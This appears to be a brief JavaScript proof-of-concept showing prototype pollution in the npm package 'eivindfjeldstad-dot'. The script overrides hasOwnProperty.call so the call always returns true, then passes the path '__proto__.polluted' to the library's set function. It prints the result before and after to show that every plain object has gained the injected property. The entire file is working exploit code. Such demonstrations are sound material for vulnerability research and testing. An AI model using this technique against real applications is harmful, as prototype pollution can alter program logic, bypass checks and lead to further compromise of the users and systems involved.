Object.prototype.hasOwnProperty.call = () => true;
const a = require('eivindfjeldstad-dot');
console.log({}.polluted);
let path = '__proto__.polluted';
a.set({}, path, 'yes');
console.log({}.polluted);